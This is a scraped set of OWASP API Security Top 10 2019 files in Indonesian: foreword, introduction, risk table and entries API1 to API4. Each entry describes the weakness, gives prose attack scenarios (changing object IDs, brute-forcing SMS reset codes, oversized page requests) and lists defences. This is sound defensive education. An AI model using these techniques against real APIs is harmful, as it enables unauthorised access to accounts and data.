chapter, pemimpin proyek, dan anggota proyek. Kami mendukung \npenelitian keamanan inovatif dengan hibah dan infrastruktur.\n\nAyo bergabung dengan kami!\n\n## Hak Cipta dan Lisensi\n\n![lisensi](images/license.png)\n\nHak Cipta © 2003-2019 Yayasan OWASP. Dokumen ini dirilis di bawah\n[Creative Commons Attribution Share-Alike 4.0 license][7]. Untuk penggunaan ulang atau\ndistribusi, Anda harus menjelaskan kepada orang lain ketentuan lisensi karya ini. \n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://www.owasp.org/index.php/OWASP_Chapter\n[4]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/", "timestamp": "2025-10-24T22:26:35.682293"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x02-foreword.md", "content": "# Kata Pengantar\n\nElemen dasar inovasi di dunia aplikasi yang digerakkan saat ini adalah \nAntarmuka Pemrograman Aplikasi (API). Dari bank, ritel, dan transportasi\nhingga IoT, kendaraan otonom, dan kota pintar, API merupakan bagian penting \ndari aplikasi seluler, SaaS, dan web modern dan dapat ditemukan di aplikasi menghadap pelanggan, \nmenghadap mitra, dan internal.\n\nKarena sifatnya, API mengekspos logika aplikasi dan data sensitif seperti Informasi Pribadi (PII) dan karena itu, \nAPI semakin menjadi target para penyerang. Tanpa API yang aman, inovasi cepat akan mustahil.\n\nMeskipun risiko keamanan web aplikasi yang lebih luas Top 10 masih masuk akal,\nkarena sifat khusus mereka, daftar risiko keamanan API spesifik diperlukan.\nKeamanan API berfokus pada strategi dan solusi untuk memahami dan mengurangi \nkerentanan dan risiko keamanan yang unik terkait dengan API.\n\nJika Anda sudah familiar dengan [Proyek OWASP Top 10][1], maka Anda akan melihat\nkesamaan antara kedua dokumen: keduanya ditujukan untuk keterbacaan dan adopsi. Jika Anda baru mengenal \nseri OWASP Top 10, mungkin lebih baik membaca bagian [Risiko Keamanan API][2] dan [Metodologi dan Data][3] \nsebelum melompat ke daftar 10 besar.\n\nAnda dapat berkontribusi pada OWASP API Security Top 10 dengan pertanyaan, komentar,\ndan ide Anda di repositori proyek GitHub kami:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nAnda dapat menemukan OWASP API Security Top 10 di sini:\n\n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security \n\nKami ingin berterima kasih kepada semua kontributor yang membuat proyek ini dimungkinkan dengan upaya dan kontribusi mereka. \nMereka semua tercantum di bagian [Ucapan Terima Kasih][4]. Terima kasih!\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:35.794655"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x03-introduction.md", "content": "# Pendahuluan\n\n## Selamat Datang di OWASP API Security Top 10 - 2019!\n\nSelamat datang di edisi pertama OWASP API Security Top 10. Jika Anda sudah akrab dengan seri OWASP Top 10, Anda akan melihat kesamaannya: tujuannya adalah mudah dibaca dan diadopsi. Jika tidak, pertimbangkan untuk mengunjungi [halaman wiki OWASP API Security Project][1], sebelum menggali lebih dalam tentang risiko keamanan API yang paling kritis.\n\nAPI memainkan peran yang sangat penting dalam arsitektur aplikasi modern. Karena penciptaan kesadaran keamanan dan inovasi memiliki tempo yang berbeda, penting untuk fokus pada kelemahan keamanan API yang umum.  \n\nTujuan utama OWASP API Security Top 10 adalah untuk mendidik mereka yang terlibat dalam pengembangan dan pemeliharaan API, misalnya pengembang, desainer, arsitek, manajer, atau organisasi.\n\nDi bagian [Metodologi dan Data][2], Anda dapat membaca lebih lanjut tentang bagaimana edisi pertama ini dibuat. Di versi mendatang, kami ingin melibatkan industri keamanan, dengan panggilan data publik. Untuk saat ini, kami mendorong semua orang untuk berkontribusi dengan pertanyaan, komentar, dan ide di repositori [GitHub][3] atau [Mailing list][4] kami.\n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:35.911648"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x04-release-notes.md", "content": "# Catatan Rilis\n\nIni adalah edisi OWASP API Security Top 10 pertama, yang direncanakan akan diperbarui secara berkala, setiap tiga atau empat tahun sekali.\n\nTidak seperti versi ini, di versi mendatang, kami ingin melakukan panggilan data publik, melibatkan industri keamanan dalam upaya ini. Di bagian [Metodologi dan Data][1], Anda akan menemukan detail lebih lanjut tentang bagaimana versi ini dibangun. Untuk detail lebih lanjut tentang risiko keamanan, harap merujuk pada bagian [API Security Risks][2].\n\nPenting untuk menyadari bahwa selama beberapa tahun terakhir, arsitektur aplikasi telah berubah secara signifikan. Saat ini, API memainkan peran yang sangat penting dalam arsitektur baru ini dari mikroservis, Single Page Applications (SPAs), aplikasi seluler, IoT, dan lainnya.\n\nOWASP API Security Top 10 merupakan upaya yang dibutuhkan untuk menciptakan kesadaran tentang masalah keamanan API modern. Hanya mungkin karena upaya besar dari beberapa sukarelawan, semuanya terdaftar di bagian [Penghargaan][3]. Terima kasih!\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:36.060733"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x10-api-security-risks.md", "content": "# Risiko Keamanan API\n\n[OWASP Risk Rating Methodology][1] digunakan untuk melakukan analisis risiko. \n\nTabel di bawah ini merangkum terminologi yang terkait dengan skor risiko.\n\n| Agen Ancaman | Dapat Dieksploitasi | Prevalensi Kelemahan | Dapat Dideteksi Kelemahan | Dampak Teknis | Dampak Bisnis |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Khusus API | Mudah: **3** | Luas **3** | Mudah **3** | Parah **3** | Spesifik Bisnis |  \n| Khusus API | Rata-rata: **2** | Umum **2** | Rata-rata **2** | Sedang **2** | Spesifik Bisnis |\n| Khusus API | Sulit: **1** | Sulit **1** | Sulit **1** | Minor **1** | Spesifik Bisnis |\n\n**Catatan**: Pendekatan ini tidak memperhitungkan kemungkinan agen ancaman. Juga tidak memperhitungkan berbagai detail teknis yang terkait dengan aplikasi tertentu Anda. Faktor-faktor apa pun dapat secara signifikan mempengaruhi kemungkinan keseluruhan penyerang menemukan dan mengeksploitasi kerentanan tertentu. Peringkat ini tidak memperhitungkan dampak aktual pada bisnis Anda. Organisasi Anda harus memutuskan seberapa banyak risiko keamanan dari aplikasi dan API yang akan diterima organisasi mengingat budaya, industri, dan lingkungan peraturan Anda. Tujuan OWASP API Security Top 10 bukan untuk melakukan analisis risiko ini untuk Anda.\n\n## Referensi\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### Eksternal\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:36.174314"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x11-t10.md", "content": "# OWASP Top 10 Risiko Keamanan API – 2019\n\n| Risiko | Deskripsi |\n| ---- | ----------- |\n| API1:2019 - Otorisasi Tingkat Objek yang Rusak | API cenderung mengekspos endpoint yang menangani pengidentifikasi objek, menciptakan masalah Otorisasi Akses Tingkat yang luas. Pemeriksaan otorisasi tingkat objek harus dipertimbangkan dalam setiap fungsi yang mengakses sumber data menggunakan input dari pengguna. | \n| API2:2019 - Otentikasi Pengguna yang Rusak | Mekanisme otentikasi sering diimplementasikan dengan salah, memungkinkan penyerang mengkompromikan token otentikasi atau memanfaatkan celah implementasi untuk mengambil alih identitas pengguna lain sementara atau permanen. Mengompromikan kemampuan sistem untuk mengidentifikasi klien/pengguna, mengkompromikan keamanan API secara keseluruhan. |\n| API3:2019 - Pemaparan Data yang Berlebihan | Menantikan implementasi generik, pengembang cenderung mengekspos semua properti objek tanpa mempertimbangkan sensitivitas individu mereka, mengandalkan klien untuk melakukan penyaringan data sebelum menampilkannya ke pengguna. |  \n| API4:2019 - Kurangnya Sumber Daya & Pembatasan Laju | Cukup sering, API tidak memberlakukan pembatasan apa pun pada ukuran atau jumlah sumber daya yang dapat diminta oleh klien/pengguna. Tidak hanya dapat berdampak pada kinerja server API, yang mengarah ke Denial of Service (DoS), tetapi juga membiarkan pintu terbuka untuk celah otentikasi seperti brute force. |\n| API5:2019 - Otorisasi Tingkat Fungsi yang Rusak | Kebijakan kontrol akses kompleks dengan hierarki, kelompok, dan peran yang berbeda, dan pemisahan yang tidak jelas antara fungsi administratif dan reguler, cenderung mengarah pada celah otorisasi. Dengan memanfaatkan masalah ini, penyerang mendapatkan akses ke sumber daya pengguna lain dan/atau fungsi administratif. |  \n| API6:2019 - Mass Assignment | Mengikat data yang disediakan klien (misalnya, JSON) ke model data, tanpa penyaringan properti yang tepat berdasarkan daftar putih, biasanya mengarah ke Mass Assignment. Menebak properti objek, mengeksplorasi titik akhir API lainnya, membaca dokumentasi, atau menyediakan properti objek tambahan dalam muatan permintaan, memungkinkan penyerang memodifikasi properti objek yang seharusnya tidak mereka lakukan. |\n| API7:2019 - Kesalahan Konfigurasi Keamanan | Kesalahan konfigurasi keamanan umumnya merupakan hasil dari konfigurasi default yang tidak aman, konfigurasi yang tidak lengkap atau ad-hoc, penyimpanan cloud terbuka, header HTTP yang dikonfigurasi salah, metode HTTP yang tidak perlu, berbagi sumber daya Cross-Origin (CORS) yang longgar, dan pesan kesalahan yang terperinci mengandung informasi sensitif. | \n| API8:2019 - Injeksi | Celah injeksi, seperti SQL, NoSQL, Command Injection, dll., terjadi ketika data yang tidak dipercaya dikirim ke interpreter sebagai bagian dari perintah atau kueri. Data berbahaya penyerang dapat menipu interpreter untuk mengeksekusi perintah yang tidak diinginkan atau mengakses data tanpa otorisasi yang tepat. |\n| API9:2019 - Pengelolaan Aset yang Tidak Tepat | API cenderung mengekspos lebih banyak endpoint daripada aplikasi web tradisional, sehingga dokumentasi yang tepat dan terbaru sangat penting. Inventarisasi host dan versi API yang diterapkan yang tepat juga memainkan peran penting untuk memitigasi masalah seperti versi API usang dan endpoint debug yang terekspos. |\n| API10:2019 - Logging & Pemantauan yang Tidak Memadai | Pencatatan dan pemantauan yang tidak memadai, dipasangkan dengan integrasi insiden yang hilang atau tidak efektif, memungkinkan penyerang untuk menyerang sistem lebih lanjut, mempertahankan persistensi, berpindah ke lebih banyak sistem untuk mengutak-atik, mengekstrak, atau menghancurkan data. Sebagian besar studi pelanggaran menunjukkan waktu untuk mendeteksi pelanggaran adalah lebih dari 200 hari, biasanya dideteksi oleh pihak eksternal daripada proses internal atau pemantauan. |", "timestamp": "2025-10-24T22:26:36.281514"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Otorisasi Tingkat Objek yang Rusak  \n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **3** | Prevalensi **3** : Deteksi **2** | Teknis **3** : Spesifik Bisnis |\n| Penyerang dapat memanfaatkan endpoint API yang rentan terhadap otorisasi tingkat objek yang rusak dengan memanipulasi ID objek yang dikirim dalam permintaan. Hal ini dapat menyebabkan akses tidak sah ke data sensitif. Masalah ini sangat umum dalam aplikasi berbasis API karena komponen server biasanya tidak sepenuhnya melacak status klien, dan sebaliknya, lebih bergantung pada parameter seperti ID objek, yang dikirim dari klien untuk memutuskan objek mana yang akan diakses. | Ini telah menjadi serangan paling umum dan berdampak pada API. Mekanisme otorisasi dan kontrol akses dalam aplikasi modern kompleks dan meluas. Bahkan jika aplikasi mengimplementasikan infrastruktur yang tepat untuk pemeriksaan otorisasi, pengembang mungkin lupa menggunakan pemeriksaan ini sebelum mengakses objek sensitif. Deteksi kontrol akses biasanya tidak dapat diterapkan untuk pengujian statis atau dinamis otomatis. | Akses tidak sah dapat mengakibatkan pengungkapan data ke pihak yang tidak berwenang, kehilangan data, atau manipulasi data. Akses tidak sah ke objek juga dapat mengarah ke pengambilalihan akun secara penuh. |\n\n## Apakah API Rentan?\n\nOtorisasi tingkat objek adalah mekanisme kontrol akses yang biasanya diimplementasikan di tingkat kode untuk memvalidasi bahwa satu pengguna hanya dapat mengakses objek yang seharusnya mereka akses. \n\nSetiap endpoint API yang menerima ID objek, dan melakukan jenis tindakan apa pun pada objek, harus menerapkan pemeriksaan otorisasi tingkat objek. Pemeriksaan harus memvalidasi bahwa pengguna yang login memiliki akses untuk melakukan tindakan yang diminta pada objek yang diminta. \n\nKegagalan dalam mekanisme ini biasanya menyebabkan pengungkapan informasi yang tidak sah, modifikasi, atau penghancuran semua data.\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nPlatform e-commerce untuk toko online (toko) menyediakan halaman daftar dengan grafik pendapatan untuk toko hosting mereka. Memeriksa permintaan browser, penyerang dapat mengidentifikasi endpoint API yang digunakan sebagai sumber data untuk grafik tersebut dan polanya `/shops/{shopName}/revenue_data.json`. Menggunakan endpoint API lainnya, penyerang dapat mendapatkan daftar semua nama toko yang di-host. Dengan skrip sederhana untuk memanipulasi nama di daftar, mengganti `{shopName}` dalam URL, penyerang mendapatkan akses ke data penjualan ribuan toko e-commerce.\n\n### Skenario #2 \n\nSaat memantau lalu lintas jaringan perangkat wearable, permintaan HTTP `PATCH` berikut menarik perhatian penyerang karena adanya header permintaan HTTP kustom `X-User-Id: 54796`. Mengganti nilai `X-User-Id` dengan `54795`, penyerang menerima respons HTTP yang berhasil, dan dapat memodifikasi data akun pengguna lain.\n\n## Cara Mencegah\n\n* Implementasikan mekanisme otorisasi yang tepat yang mengandalkan kebijakan dan hierarki pengguna.\n* Gunakan mekanisme otorisasi untuk memeriksa apakah pengguna yang login memiliki akses untuk melakukan tindakan yang diminta pada catatan di setiap fungsi yang menggunakan input dari klien untuk mengakses catatan di database.  \n* Lebih baik menggunakan nilai acak dan tidak terduga sebagai ID catatan. \n* Menulis tes untuk mengevaluasi mekanisme otorisasi. Jangan menerapkan perubahan rentan yang merusak tes.\n\n## Referensi\n\n### Eksternal\n\n* [CWE-284: Kontrol Akses yang Tidak Tepat][1]  \n* [CWE-285: Otorisasi yang Tidak Tepat][2]\n* [CWE-639: Otorisasi Melewati Kunci yang Dikendalikan Pengguna][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html \n[3]: https://cwe.mitre.org/data/definitions/639.html", "timestamp": "2025-10-24T22:26:36.395895"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa2-broken-user-authentication.md", "content": "# API2:2019 Otentikasi Pengguna yang Rusak\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **3** | Prevalensi **2** : Deteksi **2** | Teknis **3** : Spesifik Bisnis |\n| Otentikasi dalam API adalah mekanisme yang kompleks dan membingungkan. Insinyur perangkat lunak dan keamanan mungkin memiliki kesalahpahaman tentang batasan otentikasi dan cara mengimplementasikannya dengan benar. Selain itu, mekanisme otentikasi adalah target yang mudah bagi penyerang, karena terbuka untuk semua orang. Dua poin ini membuat komponen otentikasi berpotensi rentan terhadap banyak eksploitasi. | Ada dua sub-masalah: 1. Kurangnya mekanisme perlindungan: endpoint API yang bertanggung jawab untuk otentikasi harus diperlakukan berbeda dari endpoint reguler dan menerapkan lapisan perlindungan tambahan 2. Kesalahan implementasi mekanisme: Mekanisme digunakan/diimplementasikan tanpa mempertimbangkan vektor serangan, atau itu kasus penggunaan yang salah (misalnya, mekanisme otentikasi yang dirancang untuk klien IoT mungkin bukan pilihan yang tepat untuk aplikasi web). | Penyerang dapat mengambil alih akun pengguna lain dalam sistem, membaca data pribadi mereka, dan melakukan tindakan sensitif atas nama mereka, seperti transaksi uang dan mengirim pesan pribadi. |\n\n## Apakah API Rentan? \n\nTitik akhir dan alur otentikasi adalah aset yang perlu dilindungi. “Lupa kata sandi / reset kata sandi” harus diperlakukan sama seperti mekanisme otentikasi. \n\nAPI rentan jika:\n* Mengizinkan [credential stuffing][1] di mana penyerang memiliki daftar nama pengguna dan kata sandi yang valid. \n* Mengizinkan penyerang melakukan serangan brute force pada akun pengguna yang sama, tanpa menyajikan mekanisme captcha/penguncian akun.\n* Mengizinkan kata sandi yang lemah. \n* Mengirim detail otentikasi sensitif, seperti token otentikasi dan kata sandi di URL.\n* Tidak memvalidasi keaslian token.\n* Menerima token JWT yang tidak ditandatangani/lemah ditandatangani (`\"alg\": \"none\"`) / tidak memvalidasi tanggal kedaluwarsa mereka.\n* Menggunakan kata sandi teks polos, tidak dienkripsi, atau di-hash lemah. \n* Menggunakan kunci enkripsi yang lemah.\n\n## Skenario Serangan Contoh \n\n## Skenario #1\n\n[Credential stuffing][1] (menggunakan [daftar nama pengguna/kata sandi yang diketahui][2]), adalah serangan yang umum. Jika aplikasi tidak menerapkan ancaman otomatis atau perlindungan stuffing kredensial, aplikasi dapat digunakan sebagai oracle kata sandi (penguji) untuk menentukan apakah kredensial valid.\n\n## Skenario #2\n\nSeorang penyerang memulai alur kerja pemulihan kata sandi dengan menerbitkan permintaan POST ke `/api/system/verification-codes` dan dengan menyediakan nama pengguna dalam body permintaan. Selanjutnya token SMS dengan 6 digit dikirim ke telepon korban. Karena API tidak menerapkan kebijakan pembatasan laju, penyerang dapat menguji semua kombinasi yang mungkin menggunakan skrip multi-thread, terhadap endpoint `/api/system/verification-codes/{smsToken}` untuk menemukan token yang benar dalam beberapa menit.\n\n## Cara Mencegah\n\n* Pastikan Anda mengetahui semua kemungkinan alur untuk mengotentikasi ke API (mobile/web/tautan dalam yang mengimplementasikan otentikasi satu klik/dll.)\n* Tanyakan pada insinyur Anda alur apa yang Anda lewatkan.\n* Baca tentang mekanisme otentikasi Anda. Pastikan Anda memahami apa dan bagaimana mereka digunakan. OAuth bukan otentikasi, dan begitu juga kunci API.\n* Jangan menemukan kembali roda dalam otentikasi, generasi token, penyimpanan kata sandi. Gunakan standar.\n* Endpoint pemulihan kredensial/lupa kata sandi harus diperlakukan seperti titik akhir login dalam hal brute force, pembatasan laju, dan perlindungan penguncian.\n* Gunakan [OWASP Authentication Cheatsheet][3]. \n* Jika memungkinkan, terapkan otentikasi multifaktor.\n* Terapkan mekanisme anti-brute force untuk memitigasi stuffing kredensial, serangan kamus, dan serangan brute force pada titik akhir otentikasi Anda. Mekanisme ini harus lebih ketat daripada mekanisme pembatasan laju normal pada API Anda.\n* Terapkan [penguncian akun][4] / mekanisme captcha untuk mencegah brute force terhadap pengguna tertentu. Terapkan pemeriksaan kata sandi lemah.\n* Kunci API seharusnya tidak digunakan untuk otentikasi pengguna, tetapi untuk [otentikasi aplikasi/proyek klien][5]. \n\n## Referensi\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]  \n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### Eksternal \n\n* [CWE-798: Penggunaan Kredensial Hard-coded][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003) \n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html", "timestamp": "2025-10-24T22:26:36.520097"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Pemaparan Data yang Berlebihan\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **3** | Prevalensi **2** : Deteksi **2** | Teknis **2** : Spesifik Bisnis |\n| Eksploitasi Pemaparan Data Berlebihan sederhana, dan biasanya dilakukan dengan menyadap lalu lintas untuk menganalisis respon API, mencari pemaparan data sensitif yang seharusnya tidak dikembalikan ke pengguna. | API mengandalkan klien untuk melakukan penyaringan data. Karena API digunakan sebagai sumber data, terkadang pengembang mencoba mengimplementasikannya secara generik tanpa memikirkan sensitivitas data yang terpapar. Alat otomatis biasanya tidak dapat mendeteksi jenis kerentanan ini karena sulit membedakan antara data yang sah dikembalikan dari API, dan data sensitif yang tidak boleh dikembalikan tanpa pemahaman mendalam tentang aplikasi. | Pemaparan Data Berlebihan umumnya mengarah pada pemaparan data sensitif. |\n\n## Apakah API Rentan?\n\nAPI mengembalikan data sensitif ke klien berdasarkan desain. Data ini biasanya disaring di sisi klien sebelum ditampilkan ke pengguna. Penyerang dengan mudah dapat menyadap lalu lintas dan melihat data sensitif.\n\n## Skenario Serangan Contoh \n\n### Skenario #1\n\nTim seluler menggunakan endpoint `/api/articles/{articleId}/comments/{commentId}` dalam tampilan artikel untuk merender metadata komentar. Menyadap lalu lintas aplikasi seluler, seorang penyerang mengetahui bahwa data sensitif lain terkait penulis komentar juga dikembalikan. Implementasi endpoint menggunakan metode `toJSON()` generik pada model `User`, yang berisi PII, untuk men-serialisasi objek.\n\n### Skenario #2 \n\nSistem pengawasan berbasis IOT memungkinkan administrator membuat pengguna dengan izin yang berbeda. Seorang admin membuat akun pengguna untuk satpam baru yang hanya boleh mengakses bangunan tertentu di situs tersebut. Setelah satpam menggunakan aplikasi selulernya, panggilan API dipicu ke: `/api/sites/111/cameras` untuk menerima data tentang kamera yang tersedia dan menampilkannya di dashboard. Respons berisi daftar dengan rincian tentang kamera dalam format berikut: `{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`. Meskipun GUI klien hanya menampilkan kamera yang seharusnya satpam ini akses, respons API aktual berisi daftar lengkap semua kamera di situs.  \n\n## Cara Mencegah\n\n* Jangan pernah mengandalkan sisi klien untuk menyaring data sensitif.\n* Tinjau respon dari API untuk memastikan hanya berisi data yang sah. \n* Insinyur backend harus selalu bertanya pada diri sendiri \"siapa konsumen data ini?\" sebelum memaparkan endpoint API baru.  \n* Hindari menggunakan metode generik seperti `to_json()` dan `to_string()`. Sebaliknya, pilih properti spesifik yang benar-benar ingin Anda kembalikan.\n* Klasifikasikan informasi sensitif dan pribadi (PII) yang disimpan dan dikelola aplikasi Anda, meninjau semua panggilan API yang mengembalikan informasi tersebut untuk melihat apakah respons ini menimbulkan masalah keamanan.\n* Implementasikan mekanisme validasi respons berbasis skema sebagai lapisan keamanan tambahan. Sebagai bagian dari mekanisme ini, tentukan dan paksakan data yang dikembalikan oleh semua metode API, termasuk kesalahan.\n\n\n## Referensi \n\n### Eksternal\n\n* [CWE-213: Pemaparan Informasi yang Disengaja][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html", "timestamp": "2025-10-24T22:26:36.630942"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Kurangnya Sumber Daya & Pembatasan Laju\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **2** | Prevalensi **3** : Deteksi **3** | Teknis **2** : Spesifik Bisnis |  \n| Eksploitasi memerlukan permintaan API sederhana. Tidak ada otentikasi yang diperlukan. Beberapa permintaan secara bersamaan dapat dilakukan dari satu komputer lokal atau dengan menggunakan sumber daya komputasi cloud. | Umum ditemukan API yang tidak menerapkan pembatasan laju atau API di mana batas tidak ditetapkan dengan benar. | Eksploitasi dapat mengarah ke DoS, membuat API tidak responsif atau bahkan tidak tersedia. |\n\n## Apakah API Rentan?\n\nPermintaan API mengonsumsi sumber daya seperti jaringan, CPU, memori, dan penyimpanan. Jumlah sumber daya yang diperlukan untuk memenuhi permintaan sangat bergantung pada input pengguna dan logika bisnis endpoint. Juga, pertimbangkan fakta bahwa permintaan dari beberapa klien API bersaing untuk sumber daya. API rentan jika setidaknya satu dari batasan berikut hilang atau disetel secara tidak tepat (misalnya, terlalu rendah/tinggi):\n\n* Batas waktu eksekusi  \n* Memori maksimum yang dapat dialokasikan\n* Jumlah deskriptor berkas\n* Jumlah proses\n* Ukuran muatan permintaan (misalnya, unggahan) \n* Jumlah permintaan per klien/sumber daya\n* Jumlah catatan per halaman untuk dikembalikan dalam satu respons permintaan\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nSeorang penyerang mengunggah gambar besar dengan menerbitkan permintaan POST ke `/api/v1/images`. Saat unggahan selesai, API membuat beberapa thumbnail dengan ukuran yang berbeda. Karena ukuran gambar yang diunggah, memori yang tersedia habis selama pembuatan thumbnail dan API menjadi tidak responsif.\n\n### Skenario #2\n\nKami memiliki aplikasi yang berisi daftar pengguna di UI dengan batas `200` pengguna per halaman. Daftar pengguna diambil dari server menggunakan kueri berikut: `/api/users?page=1&size=200`. Seorang penyerang mengubah parameter `size` menjadi `200.000`, menyebabkan masalah kinerja pada basis data. Sementara itu, API menjadi tidak responsif dan tidak dapat menangani permintaan lebih lanjut dari klien ini atau klien lainnya (alias DoS).\n\nSkenario yang sama dapat digunakan untuk memancing kesalahan Integer Overflow atau Buffer Overflow.\n\n## Cara Mencegah\n\n* Docker memudahkan untuk membatasi [memori][1], [CPU][2], [jumlah restart][3], [deskriptor berkas, dan proses][4].\n* Terapkan batas seberapa sering klien dapat memanggil API dalam rentang waktu tertentu.  \n* Beri tahu klien saat batas terlampaui dengan menyediakan nomor batas dan waktu saat batas akan direset.\n* Tambahkan validasi server-side yang tepat untuk parameter string kueri dan body permintaan, khususnya yang mengendalikan jumlah catatan yang akan dikembalikan dalam respons.\n* Tentukan dan tegakkan ukuran maksimum data pada semua parameter dan muatan masukan seperti panjang maksimum untuk string dan jumlah elemen maksimum dalam array.\n\n\n## Referensi\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### Eksternal\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts \n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf", "timestamp": "2025-10-24T22:26:36.761845"}
